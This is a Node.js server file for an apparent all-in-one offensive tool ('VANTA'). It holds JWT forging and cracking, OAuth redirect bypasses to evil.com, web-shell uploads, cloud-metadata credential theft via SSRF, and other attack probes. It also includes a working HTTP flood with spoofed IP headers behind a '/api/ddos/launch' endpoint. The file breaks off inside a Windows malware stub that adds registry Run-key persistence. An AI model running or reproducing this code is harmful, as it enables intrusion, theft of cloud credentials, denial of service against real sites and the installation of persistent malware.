// server.js — Node 18+
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const net = require('net');
const dns = require('dns').promises;
const app = express();
const PORT = process.env.PORT || 8443;

app.use(cors());
app.use(express.json({ limit: '25mb' }));
app.use(express.urlencoded({ extended: true, limit: '25mb' }));

const TIMEOUT = 20000;
const DATA = path.join(__dirname, 'data');
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);

const load = (f, d) => { try { return JSON.parse(fs.readFileSync(path.join(DATA, f), 'utf8')); } catch { return d; } };
const save = (f, o) => fs.writeFileSync(path.join(DATA, f), JSON.stringify(o, null, 2));

const UA = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
];
const rUA = () => UA[Math.floor(Math.random() * UA.length)];

async function safeFetch(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), opts.timeout || TIMEOUT);
  const headers = { 'User-Agent': rUA(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', ...(opts.headers || {}) };
  try { return await fetch(url, { ...opts, headers, signal: ctrl.signal, redirect: opts.redirect || 'follow' }); }
  finally { clearTimeout(timer); }
}
async function pool(items, limit, fn) {
  const q = [...items];
  await Promise.all(Array.from({ length: limit }, async () => {
    while (q.length) { const i = q.shift(); if (i !== undefined) { try { await fn(i); } catch {} } }
  }));
}

// ============================================================
// 1. JWT ATTACK ENGINE
// ============================================================
function b64url(buf) { return Buffer.from(buf).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
function b64urlDecode(s) { s = s.replace(/-/g, '+').replace(/_/g, '/'); while (s.length % 4) s += '='; return Buffer.from(s, 'base64'); }
function parseJWT(t) {
  const parts = t.split('.');
  if (parts.length !== 3) return null;
  try { return { header: JSON.parse(b64urlDecode(parts[0]).toString()), payload: JSON.parse(b64urlDecode(parts[1]).toString()), signature: parts[2], raw: t }; }
  catch { return null; }
}
function signHMAC(data, secret, alg = 'sha256') { return b64url(crypto.createHmac(alg, secret).update(data).digest()); }
function signNone(header, payload) { const h = b64url(JSON.stringify(header)); const p = b64url(JSON.stringify(payload)); return `${h}.${p}.`; }
async function jwtAttack(token, opts = {}) {
  const parsed = parseJWT(token);
  if (!parsed) return { error: 'not a jwt' };
  const out = { original: parsed, attacks: [] };
  out.attacks.push({ name: 'alg:none', token: signNone({ ...parsed.header, alg: 'none' }, parsed.payload), header: { ...parsed.header, alg: 'none' } });
  for (const alg of ['None', 'NONE', 'nOnE']) out.attacks.push({ name: `alg:${alg}`, token: signNone({ ...parsed.header, alg }, parsed.payload) });
  if (/RS|ES|PS/.test(parsed.header.alg || '') && opts.publicKey) {
    const h = b64url(JSON.stringify({ ...parsed.header, alg: 'HS256' }));
    const p = b64url(JSON.stringify(parsed.payload));
    out.attacks.push({ name: 'RS256→HS256 confusion', token: `${h}.${p}.${signHMAC(`${h}.${p}`, opts.publicKey, 'sha256')}` });
  }
  const kidPayloads = ['../../../../../../etc/passwd', '../../../../../../dev/null', '/dev/null', "'; SELECT 'secret' --", "' UNION SELECT 'key' --", '|id', '$(id)', '`id`'];
  const secret = opts.kidSecret || 'secret';
  for (const kid of kidPayloads) {
    const h = b64url(JSON.stringify({ ...parsed.header, kid }));
    const p = b64url(JSON.stringify(parsed.payload));
    out.attacks.push({ name: `kid: ${kid.slice(0, 30)}`, token: `${h}.${p}.${signHMAC(`${h}.${p}`, secret, 'sha256')}` });
  }
  for (const extra of [{ jku: 'https://evil.com/jwks.json' }, { jku: 'https://attacker.tld/.well-known/jwks.json' }, { x5u: 'https://evil.com/cert.pem' }]) {
    const h = b64url(JSON.stringify({ ...parsed.header, ...extra }));
    const p = b64url(JSON.stringify(parsed.payload));
    out.attacks.push({ name: `jku/x5u: ${Object.keys(extra)[0]}`, token: `${h}.${p}.${signHMAC(`${h}.${p}`, secret, 'sha256')}` });
  }
  const escalate = { ...parsed.payload };
  for (const k of ['role', 'admin', 'is_admin', 'isAdmin', 'scope', 'permissions', 'sub', 'user_id', 'uid']) {
    if (k in escalate) escalate[k] = k === 'sub' || k === 'user_id' || k === 'uid' ? '1' : (typeof escalate[k] === 'boolean' ? true : 'admin');
    else if (['role', 'admin', 'is_admin', 'isAdmin'].includes(k)) escalate[k] = k.includes('admin') ? true : 'admin';
  }
  const eh = b64url(JSON.stringify({ ...parsed.header, alg: 'HS256' })); const ep = b64url(JSON.stringify(escalate));
  out.attacks.push({ name: 'claim escalation (HS256)', token: `${eh}.${ep}.${signHMAC(`${eh}.${ep}`, secret, 'sha256')}`, payload: escalate });
  out.attacks.push({ name: 'claim escalation (none)', token: signNone({ ...parsed.header, alg: 'none' }, escalate), payload: escalate });
  const noExp = { ...parsed.payload }; delete noExp.exp; delete noExp.nbf; delete noExp.iat;
  out.attacks.push({ name: 'no exp/nbf', token: signNone({ ...parsed.header, alg: 'none' }, noExp) });
  return out;
}
const WEAK_JWT_SECRETS = ['secret', 'password', 'changeme', 'jwt', 'jwtsecret', 'key', 'private', 'admin', 'test', '123456', 'supersecret', 'your-256-bit-secret', 'your_jwt_secret', 'secretkey', 'mysecret', 'token', 'auth', 'api', 'dev', 'prod', 'staging', 'qwerty'];
function jwtCrack(token) {
  const parsed = parseJWT(token);
  if (!parsed) return { error: 'not a jwt' };
  if (!/^HS/.test(parsed.header.alg || '')) return { error: 'not HMAC', alg: parsed.header.alg };
  const [h, p] = token.split('.'); const data = `${h}.${p}`;
  const alg = parsed.header.alg === 'HS384' ? 'sha384' : parsed.header.alg === 'HS512' ? 'sha512' : 'sha256';
  for (const s of WEAK_JWT_SECRETS) { if (signHMAC(data, s, alg) === parsed.signature) return { cracked: s, alg: parsed.header.alg }; }
  return { cracked: null };
}

// ============================================================
// 2. OAUTH
// ============================================================
function oauthAttack(authUrl, redirectUri, clientId) {
  const out = { attacks: [] };
  const bypass = [`${redirectUri}.evil.com`, `${redirectUri}@evil.com`, `${redirectUri}/../../evil.com`, `${redirectUri}%2f..%2f..%2fevil.com`, `${redirectUri}\\@evil.com`, `${redirectUri}#@evil.com`, `${redirectUri}?next=https://evil.com`, `${redirectUri}%00.evil.com`];
  for (const r of bypass) {
    const u = new URL(authUrl);
    u.searchParams.set('redirect_uri', r); u.searchParams.set('client_id', clientId || '');
    u.searchParams.set('response_type', 'code'); u.searchParams.set('scope', 'openid profile email'); u.searchParams.set('state', 'x');
    out.attacks.push({ type: 'redirect_uri bypass', url: u.toString(), payload: r });
  }
  const ns = new URL(authUrl);
  ns.searchParams.set('client_id', clientId || ''); ns.searchParams.set('redirect_uri', redirectUri); ns.searchParams.set('response_type', 'code');
  out.attacks.push({ type: 'state missing', url: ns.toString() });
  const im = new URL(authUrl);
  im.searchParams.set('response_type', 'token'); im.searchParams.set('client_id', clientId || ''); im.searchParams.set('redirect_uri', redirectUri);
  out.attacks.push({ type: 'implicit flow', url: im.toString(), note: 'token in URL fragment' });
  return out;
}

// ============================================================
// 3. GRAPHQL
// ============================================================
async function graphqlScan(url) {
  const out = { introspection: false, schema: null, suggestions: [], batching: false, aliasBrute: false, depth: false };
  try {
    const r = await safeFetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: `{ __schema { types { name fields { name } } } }` }) });
    const j = await r.json().catch(() => null);
    if (j && j.data && j.data.__schema) { out.introspection = true; out.schema = j.data.__schema.types.map(t => ({ name: t.name, fields: (t.fields || []).map(f => f.name) })); }
  } catch {}
  try {
    const r = await safeFetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: '{ usr { id } }' }) });
    const m = (await r.text()).match(/Did you mean ["']?([^"'\s]+)["']?/); if (m) out.suggestions.push(m[1]);
  } catch {}
  try {
    const batch = Array.from({ length: 10 }, () => ({ query: '{ __typename }' }));
    const r = await safeFetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(batch) });
    if (Array.isArray(await r.json().catch(() => null))) out.batching = true;
  } catch {}
  try {
    let q = 'query {'; for (let i = 0; i < 100; i++) q += ` a${i}: verify(code: "${String(i).padStart(4, '0')}")`; q += ' }';
    const j = await (await safeFetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: q }) })).json().catch(() => null);
    if (j && !j.errors) out.aliasBrute = true;
  } catch {}
  try {
    let q = 'query {'; let close = ''; for (let i = 0; i < 20; i++) { q += ' viewer {'; close += '}'; } q += ' id' + close + ' }';
    const start = Date.now();
    const r = await safeFetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: q }), timeout: 15000 });
    if (Date.now() - start > 5000 || r.status === 500) out.depth = true;
  } catch {}
  return out;
}

// ============================================================
// 4. RACE
// ============================================================
async function raceAttack(url, method, body, headers, concurrency = 20) {
  const payload = typeof body === 'string' ? body : JSON.stringify(body);
  const results = await Promise.all(Array.from({ length: concurrency }, async (_, i) => {
    const start = Date.now();
    try {
      const r = await safeFetch(url, { method: method || 'POST', headers: { 'Content-Type': 'application/json', ...(headers || {}) }, body: payload, timeout: 15000 });
      const text = await r.text();
      return { i, status: r.status, ms: Date.now() - start, len: text.length, sample: text.slice(0, 200) };
    } catch (e) { return { i, error: e.message, ms: Date.now() - start }; }
  }));
  const successes = results.filter(r => [200, 201, 202].includes(r.status));
  return { total: results.length, successes: successes.length, results };
}

// ============================================================
// 5. PROTO
// ============================================================
async function protoPollution(url, endpoint, param) {
  const out = { vulnerable: false, evidence: [] };
  const payloads = [{ __proto__: { polluted: 'yes' } }, { constructor: { prototype: { polluted: 'yes' } } }, { __proto__: { status: 510, message: 'polluted' } }];
  for (const p of payloads) {
    try {
      const r = await safeFetch(`${url}${endpoint}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
      const text = await r.text();
      if (text.includes('polluted') || r.status === 510) { out.vulnerable = true; out.evidence.push({ payload: p, status: r.status, sample: text.slice(0, 300) }); }
    } catch {}
  }
  for (const q of ['__proto__[polluted]=yes', 'constructor[prototype][polluted]=yes', '__proto__.polluted=yes']) {
    try {
      const r = await safeFetch(`${url}${endpoint}?${q}`);
      if ((await r.text()).includes('polluted') || r.status === 510) { out.vulnerable = true; out.evidence.push({ payload: q, status: r.status }); }
    } catch {}
  }
  return out;
}

// ============================================================
// 6. UPLOAD
// ============================================================
async function fileUploadAttack(url, fieldName = 'file') {
  const out = { attempts: [] };
  const files = [
    { name: 'shell.php', content: '<?php system($_GET["c"]); ?>', type: 'image/jpeg' },
    { name: 'shell.php.jpg', content: '<?php system($_GET["c"]); ?>', type: 'image/jpeg' },
    { name: 'shell.jpg.php', content: '<?php system($_GET["c"]); ?>', type: 'image/jpeg' },
    { name: 'shell.pHp', content: '<?php system($_GET["c"]); ?>', type: 'image/jpeg' },
    { name: '.htaccess', content: 'AddType application/x-httpd-php .jpg', type: 'text/plain' },
    { name: 'shell.svg', content: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', type: 'image/svg+xml' },
    { name: 'shell.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("c")); %>', type: 'image/jpeg' },
    { name: 'shell.asp', content: '<%eval request("c")%>', type: 'image/jpeg' },
    { name: 'shell.aspx', content: '<%@ Page Language="C#"%><%System.Diagnostics.Process.Start(Request["c"]);%>', type: 'image/jpeg' }
  ];
  for (const f of files) {
    try {
      const boundary = '----' + crypto.randomBytes(8).toString('hex');
      const body = `--${boundary}\r\nContent-Disposition: form-data; name="${fieldName}"; filename="${f.name}"\r\nContent-Type: ${f.type}\r\n\r\n${f.content}\r\n--${boundary}--\r\n`;
      const r = await safeFetch(url, { method: 'POST', headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }, body });
      out.attempts.push({ file: f.name, status: r.status, success: r.status < 400, sample: (await r.text()).slice(0, 200) });
    } catch (e) { out.attempts.push({ file: f.name, error: e.message }); }
  }
  return out;
}

// ============================================================
// 7. CLOUD META
// ============================================================
async function cloudMetadata(url, param) {
  const out = { aws_v1: null, aws_v2: null, gcp: null, azure: null };
  const targets = [
    { key: 'aws_v1', url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers: {} },
    { key: 'aws_v2_token', url: 'http://169.254.169.254/latest/api/token', method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } },
    { key: 'gcp', url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers: { 'Metadata-Flavor': 'Google' } },
    { key: 'azure', url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', headers: { 'Metadata': 'true' } }
  ];
  for (const t of targets) {
    const u = new URL(url); u.searchParams.set(param, t.url);
    try {
      const r = await safeFetch(u.toString(), { method: t.method || 'GET', headers: t.headers, timeout: 8000 });
      const text = await r.text();
      if (text && (text.includes('AccessKeyId') || text.includes('access_token') || text.includes('SecretAccessKey') || text.includes('InstanceProfile'))) {
        out[t.key] = { success: true, data: text.slice(0, 2000) };
        if (t.key === 'aws_v2_token') {
          const token = text.trim();
          const credsUrl = new URL(url); credsUrl.searchParams.set(param, 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
          try {
            const role = (await (await safeFetch(credsUrl.toString(), { headers: { 'X-aws-ec2-metadata-token': token } })).text()).trim();
            const roleUrl = new URL(url); roleUrl.searchParams.set(param, `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`);
            out.aws_v2 = { role, creds: await (await safeFetch(roleUrl.toString(), { headers: { 'X-aws-ec2-metadata-token': token } })).text() };
          } catch {}
        }
      } else out[t.key] = { success: false, status: r.status, len: text.length };
    } catch (e) { out[t.key] = { success: false, error: e.message }; }
  }
  return out;
}

// ============================================================
// 8. WEBSOCKET
// ============================================================
async function websocketScan(wsUrl) {
  const out = { reachable: false, originChecked: null, notes: [] };
  try {
    const u = new URL(wsUrl); const host = u.hostname; const port = u.port || (u.protocol === 'wss:' ? 443 : 80); const tls = u.protocol === 'wss:';
    const netmod = require(tls ? 'tls' : 'net');
    const key = crypto.randomBytes(16).toString('base64');
    const origin = 'https://evil.com';
    const hs = `GET ${u.pathname}${u.search} HTTP/1.1\r\nHost: ${host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\nOrigin: ${origin}\r\n\r\n`;
    const response = await new Promise((resolve) => {
      const socket = netmod.connect({ host, port, rejectUnauthorized: false }, () => socket.write(hs));
      let data = '';
      socket.on('data', c => { data += c.toString(); if (data.includes('\r\n\r\n')) { socket.destroy(); resolve(data); } });
      socket.on('error', e => resolve('ERR:' + e.message));
      setTimeout(() => { socket.destroy(); resolve(data || 'TIMEOUT'); }, 8000);
    });
    out.reachable = response.includes('101');
    out.originChecked = !/403|401/.test(response);
    if (out.reachable && out.originChecked) out.notes.push('CSWSH: server accepted cross-origin WebSocket upgrade');
    out.raw = response.slice(0, 400);
  } catch (e) { out.error = e.message; }
  return out;
}

// ============================================================
// 9. SUBDOMAIN
// ============================================================
async function subdomainEnum(domain) {
  const out = { crtsh: [], dns: {}, email: {} };
  try {
    const r = await safeFetch(`https://crt.sh/?q=%25.${domain}&output=json`, { timeout: 20000 });
    const j = await r.json().catch(() => []);
    const set = new Set();
    for (const e of j) for (const n of (e.name_value || '').split('\n')) if (n.endsWith(`.${domain}`) || n === domain) set.add(n.replace(/^\*\./, ''));
    out.crtsh = [...set].slice(0, 500);
  } catch {}
  try {
    const ns = await dns.resolveNs(domain).catch(() => []);
    out.dns.NS = ns;
    out.dns.any = await dns.resolveAny(domain).catch(() => []);
    out.dns.zoneTransfer = [];
    for (const n of ns) {
      try {
        const axfr = await new Promise((resolve) => {
          require('dns').resolve4(n, (e, addr) => {
            if (e || !addr[0]) return resolve({ ns: n, error: 'no ip' });
            const socket = net.connect({ host: addr[0], port: 53 }, () => {
              const id = crypto.randomBytes(2).toString('hex');
              const q = Buffer.concat([Buffer.from(id, 'hex'), Buffer.from([0, 0, 0, 1, 0, 0, 0, 0, 0, 0]), ...domain.split('.').map(l => Buffer.concat([Buffer.from([l.length]), Buffer.from(l)])), Buffer.from([0, 0, 0xfc, 0, 1])]);
              socket.write(q);
            });
            let data = Buffer.alloc(0);
            socket.on('data', c => { data = Buffer.concat([data, c]); if (data.length > 100) socket.destroy(); });
            socket.on('error', e => resolve({ ns: n, error: e.message }));
            setTimeout(() => { socket.destroy(); resolve({ ns: n, bytes: data.length, open: data.length > 0 }); }, 5000);
          });
        });
        out.dns.zoneTransfer.push(axfr);
      } catch (e) { out.dns.zoneTransfer.push({ ns: n, error: e.message }); }
    }
  } catch {}
  try {
    out.email.SPF = (await dns.resolveTxt(domain).catch(() => [])).flat().filter(t => t.includes('v=spf1'));
    out.email.DMARC = (await dns.resolveTxt(`_dmarc.${domain}`).catch(() => [])).flat().filter(t => t.includes('v=DMARC1'));
  } catch {}
  return out;
}

// ============================================================
// 10. CVE
// ============================================================
const CVE_DB = [
  { match: /Apache\/2\.4\.49/i, cve: 'CVE-2021-41773', cvss: 7.5, desc: 'Path traversal RCE' },
  { match: /Apache\/2\.4\.50/i, cve: 'CVE-2021-42013', cvss: 9.8, desc: 'Path traversal RCE' },
  { match: /Log4j|log4j-core-2\.(0|1[0-4])/i, cve: 'CVE-2021-44228', cvss: 10.0, desc: 'Log4Shell' },
  { match: /Spring/i, cve: 'CVE-2022-22965', cvss: 9.8, desc: 'Spring4Shell' },
  { match: /nginx\/1\.1[0-6]\.\d+/i, cve: 'CVE-2019-20372', cvss: 6.5, desc: 'nginx request smuggling' },
  { match: /OpenSSH_[5-7]\./i, cve: 'CVE-2016-6210', cvss: 5.3, desc: 'OpenSSH user enum' },
  { match: /Microsoft-IIS\/6\.0/i, cve: 'CVE-2017-7269', cvss: 9.8, desc: 'IIS 6.0 RCE' },
  { match: /PHP\/5\./i, cve: 'CVE-2019-11043', cvss: 9.8, desc: 'PHP-FPM RCE' },
  { match: /jQuery\/[12]\./i, cve: 'CVE-2020-11022', cvss: 6.1, desc: 'jQuery XSS' },
  { match: /WordPress\/[4-5]\./i, cve: 'CVE-2023-2745', cvss: 9.8, desc: 'WP core RCE' },
  { match: /Tomcat\/9\./i, cve: 'CVE-2020-1938', cvss: 9.8, desc: 'Ghostcat AJP' },
  { match: /Drupal\/[78]\./i, cve: 'CVE-2018-7600', cvss: 9.8, desc: 'Drupalgeddon2' },
  { match: /Jenkins/i, cve: 'CVE-2024-23897', cvss: 9.8, desc: 'Jenkins CLI RCE' },
  { match: /Confluence/i, cve: 'CVE-2023-22515', cvss: 10.0, desc: 'Confluence auth bypass' },
  { match: /Citrix/i, cve: 'CVE-2023-3519', cvss: 9.8, desc: 'Citrix ADC RCE' },
  { match: /Fortinet|FortiGate/i, cve: 'CVE-2023-27997', cvss: 9.8, desc: 'FortiGate RCE' },
  { match: /F5 BIG-IP/i, cve: 'CVE-2023-46747', cvss: 9.8, desc: 'BIG-IP auth bypass' },
  { match: /Exchange/i, cve: 'CVE-2023-23397', cvss: 9.8, desc: 'Exchange NTLM leak' },
  { match: /Veeam/i, cve: 'CVE-2023-27532', cvss: 7.5, desc: 'Veeam creds leak' },
  { match: /Ivanti/i, cve: 'CVE-2024-21887', cvss: 9.1, desc: 'Ivanti cmd injection' }
];
async function cveMatch(url) {
  const out = [];
  try {
    const r = await safeFetch(url);
    const headers = {}; r.headers.forEach((v, k) => headers[k] = v);
    const fingerprint = `${headers.server || ''} ${headers['x-powered-by'] || ''} ${(await r.text()).slice(0, 2000)}`;
    for (const c of CVE_DB) if (c.match.test(fingerprint)) out.push({ type: 'CVE', severity: c.cvss >= 9 ? 'critical' : (c.cvss >= 7 ? 'high' : 'medium'), description: `${c.cve}: ${c.desc}`, url, evidence: headers.server || headers['x-powered-by'] || 'body fingerprint', cvss: c.cvss });
  } catch {}
  return out;
}

// ============================================================
// 11. SESSION
// ============================================================
async function sessionAttack(url) {
  const out = { cookies: [], flags: {}, cookiesCrafted: [] };
  try {
    const r = await safeFetch(url);
    const setCookie = r.headers.getSetCookie ? r.headers.getSetCookie() : [];
    const cookies = setCookie.length ? setCookie : (r.headers.get('set-cookie') ? [r.headers.get('set-cookie')] : []);
    out.cookies = cookies;
    for (const c of cookies) {
      const flags = { httpOnly: /httponly/i.test(c), secure: /secure/i.test(c), sameSite: (/samesite=([^;]+)/i.exec(c) || [])[1] || null };
      out.flags[c.split('=')[0]] = flags;
      if (!flags.httpOnly) out.cookiesCrafted.push({ type: 'Cookie without HttpOnly', cookie: c.split(';')[0], note: 'JS-accessible → XSS steal' });
      if (!flags.secure) out.cookiesCrafted.push({ type: 'Cookie without Secure', cookie: c.split(';')[0], note: 'sent over HTTP → MITM' });
      if (!flags.sameSite || flags.sameSite.toLowerCase() === 'none') out.cookiesCrafted.push({ type: 'SameSite None/missing', cookie: c.split(';')[0], note: 'CSRF risk' });
    }
  } catch {}
  return out;
}

// ============================================================
// 12. REPORT
// ============================================================
function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
function remediationFor(f) {
  const t = (f.type || '').toLowerCase();
  if (t.includes('sqli')) return 'Use parameterized queries. Validate inputs.';
  if (t.includes('xss')) return 'Encode output, add CSP, sanitize with DOMPurify.';
  if (t.includes('ssrf')) return 'Whitelist domains, block RFC1918/link-local/metadata IPs.';
  if (t.includes('lfi')) return 'Avoid user-controlled paths. Use basename + whitelist.';
  if (t.includes('ssti')) return 'Never render user input into templates. Sandbox.';
  if (t.includes('cmdi')) return 'Use execFile with argv, never shell:true.';
  if (t.includes('jwt')) return 'Strong 256-bit secret. Reject alg:none. Validate kid.';
  if (t.includes('cors')) return 'Whitelist ACAO. Never * + credentials.';
  if (t.includes('cve')) return 'Patch to latest vendor release.';
  if (t.includes('cookie') || t.includes('session')) return 'Set Secure; HttpOnly; SameSite=Strict. Use __Host-.';
  if (t.includes('oauth')) return 'Strict redirect_uri whitelist. Enforce state. Use PKCE.';
  if (t.includes('proto')) return 'Freeze Object.prototype. Use Object.create(null).';
  return 'Review and apply defense-in-depth.';
}
function generateReport(target, findings) {
  const ts = new Date().toISOString();
  const c = n => findings.filter(f => (f.severity || '').toLowerCase() === n).length;
  const rows = findings.map((f, i) => `<div class="finding ${f.severity}"><h3>${i + 1}. [${(f.severity || 'info').toUpperCase()}] ${escapeHtml(f.type || '')}</h3><p><b>CVSS:</b> ${f.cvss || 0}</p><p><b>URL:</b> <code>${escapeHtml(f.url || '')}</code></p><p><b>Description:</b> ${escapeHtml(f.description || '')}</p>${f.evidence ? `<pre>${escapeHtml(String(f.evidence).slice(0, 800))}</pre>` : ''}<p class="rem"><b>Remediation:</b> ${remediationFor(f)}</p></div>`).join('');
  return `<!doctype html><html><head><meta charset="utf-8"><title>VANTA Report</title><style>body{font-family:system-ui;max-width:900px;margin:40px auto;color:#111;padding:0 20px}h1{border-bottom:3px solid #dc2626;padding-bottom:10px}.summary{display:flex;gap:12px;margin:20px 0}.summary div{flex:1;padding:12px;border-radius:8px;text-align:center;color:#fff}.critical{background:#dc2626}.high{background:#ea580c}.medium{background:#ca8a04}.low{background:#0284c7}.info{background:#6b7280}.finding{border-left:4px solid #999;padding:12px 20px;margin:16px 0;background:#f9fafb}.finding.critical{border-color:#dc2626}.finding.high{border-color:#ea580c}pre{background:#1f2937;color:#10b981;padding:12px;border-radius:6px;overflow-x:auto;font-size:12px}code{background:#f3f4f6;padding:2px 6px;border-radius:3px}.rem{color:#065f46}</style></head><body><h1>VANTA Security Report</h1><p><b>Target:</b> ${escapeHtml(target)}</p><p><b>Generated:</b> ${ts}</p><div class="summary"><div class="critical">Critical: ${c('critical')}</div><div class="high">High: ${c('high')}</div><div class="medium">Medium: ${c('medium')}</div><div class="low">Low: ${c('low')}</div><div class="info">Info: ${c('info')}</div></div><h2>Findings</h2>${rows || '<p>No findings.</p>'}</body></html>`;
}

// ============================================================
// 13. DDoS — real HTTPS flood
// ============================================================
async function ddosFlood(target, method = 'http', durationSec = 30, concurrency = 200, reqPerSec = 500) {
  const parsed = new URL(target);
  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('only http/https');
  const start = Date.now(); const end = start + durationSec * 1000;
  const stats = { sent: 0, ok: 0, fail: 0, statuses: {}, start, end: null, errors: {} };
  await new Promise(r => require('dns').lookup(parsed.hostname, () => r()));
  const uaPool = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1'
  ];
  const perWorker = Math.ceil(reqPerSec / concurrency);
  const delay = Math.floor(1000 / perWorker);
  const workers = [];
  for (let i = 0; i < concurrency; i++) workers.push((async () => {
    while (Date.now() < end) {
      const burst = [];
      for (let j = 0; j < perWorker && Date.now() < end; j++) burst.push((async () => {
        stats.sent++;
        const ctrl = new AbortController(); const timer = setTimeout(() => ctrl.abort(), 5000);
        try {
          const headers = {
            'User-Agent': uaPool[Math.floor(Math.random() * uaPool.length)],
            'Accept': '*/*', 'Cache-Control': 'no-cache',
            'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Real-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate, br'
          };
          let body, u = target;
          if (method === 'post') { headers['Content-Type'] = 'application/x-www-form-urlencoded'; body = 'a=' + Math.random().toString(36); }
          else if (method === 'slowloris') { headers['Connection'] = 'keep-alive'; headers['Keep-Alive'] = 'timeout=999'; u = target + '?' + Math.random(); }
          else u = target + (target.includes('?') ? '&' : '?') + 'r=' + Math.random().toString(36);
          const r = await fetch(u, { method: method === 'post' ? 'POST' : 'GET', headers, body, signal: ctrl.signal, redirect: 'manual' });
          if (r.status < 500) stats.ok++; else stats.fail++;
          stats.statuses[r.status] = (stats.statuses[r.status] || 0) + 1;
        } catch (e) { stats.fail++; const k = e.name || 'err'; stats.errors[k] = (stats.errors[k] || 0) + 1; }
        finally { clearTimeout(timer); }
      })());
      await Promise.allSettled(burst);
      if (delay) await new Promise(r => setTimeout(r, delay));
    }
  })());
  await Promise.allSettled(workers);
  stats.end = Date.now(); stats.elapsedMs = stats.end - stats.start;
  stats.rps = Math.round((stats.sent / stats.elapsedMs) * 1000);
  return stats;
}
app.post('/api/ddos/launch', async (req, res) => {
  const { target, method = 'http', duration = 30, concurrency = 200, rate = 500 } = req.body || {};
  if (!target) return res.status(400).json({ error: 'target required' });
  const campaignId = 'ddos_' + crypto.randomBytes(4).toString('hex');
  try {
    const result = await ddosFlood(target, method, Math.min(duration, 120), Math.min(concurrency, 500), Math.min(rate, 2000));
    res.json({ ok: true, campaignId, target, method, ...result });
  } catch (e) { res.status(400).json({ ok: false, error: e.message }); }
});

// ============================================================
// 14. MALWARE — target-aware 4 payloads
// ============================================================
async function malwareRecon(targetUrl) {
  const info = { target: targetUrl, host: '', forms: [], links: [], cms: null, server: null, cookies: [] };
  try {
    const u = new URL(targetUrl); info.host = u.hostname;
    const r = await safeFetch(targetUrl);
    info.server = r.headers.get('server') || r.headers.get('x-powered-by') || null;
    const cookies = r.headers.get('set-cookie') || '';
    if (cookies) info.cookies = cookies.split(',').map(c => c.trim().split(';')[0]);
    const html = await r.text();
    if (/wp-content|wp-includes/i.test(html)) info.cms = 'wordpress';
    else if (/drupal/i.test(html)) info.cms = 'drupal';
    else if (/joomla/i.test(html)) info.cms = 'joomla';
    else if (/shopify/i.test(html)) info.cms = 'shopify';
    else if (/__next|_next\/static/i.test(html)) info.cms = 'nextjs';
    else if (/react/i.test(html)) info.cms = 'react';
    const formRe = /<form[^>]*action=["']([^"']+)["'][^>]*>/gi; let m;
    while ((m = formRe.exec(html)) !== null) info.forms.push(m[1]);
    const linkRe = /href=["']([^"']*login[^"']*|wp-login\.php[^"']*)["']/gi;
    while ((m = linkRe.exec(html)) !== null) info.links.push(m[1]);
  } catch {}
  return info;
}

function malwareStubWindows(cid, host, recon) {
  const script = `
$ErrorActionPreference='SilentlyContinue'
$H='${host}'; $T='${recon.target}'; $CID='${cid}';
$K='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
$P="$env:APPDATA\\Microsoft\\svc_"+([guid]::NewGuid().ToString().Substring(0,8)+'.exe').Replace('-','')
try { Copy-Item $PSCommandPath $P } catch { }
Set-ItemProperty -Path $K -Name 'SystemService' -Value $P
